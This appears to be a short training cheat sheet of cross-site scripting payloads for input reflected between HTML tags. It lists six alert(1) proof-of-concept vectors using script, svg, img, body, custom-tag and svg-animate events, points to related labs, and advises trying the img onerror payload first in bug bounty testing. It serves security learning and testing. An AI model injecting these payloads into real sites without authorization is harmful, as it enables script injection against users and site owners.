# HTML Context Payloads

## Context

Input reflected between HTML tags.

Example:

```html
<p>USER_INPUT</p>
```

---

# Basic Payload

```html
<script>alert(1)</script>
```

---

# SVG Payload

```html
<svg onload=alert(1)>
```

---

# Image Payload

```html
<img src=1 onerror=alert(1)>
```

---

# Body Event Payload

```html
<body onresize=alert(1)>
```

---

# Custom Tag Payload

```html
<xss onfocus=alert(1)>
```

---

# SVG Animation Payload

```html
<svg>
<animate
attributeName=x
dur=1s
repeatCount=1
onbegin=alert(1)>
</svg>
```

---

# Related Labs

```text
Lab11
Lab12
Lab13
Lab14
```

---

# Bug Bounty Reminder

If input appears inside:

```html
<p>
<div>
<span>
```

always test:

```html
<img src=1 onerror=alert(1)>
```

before attempting complex payloads.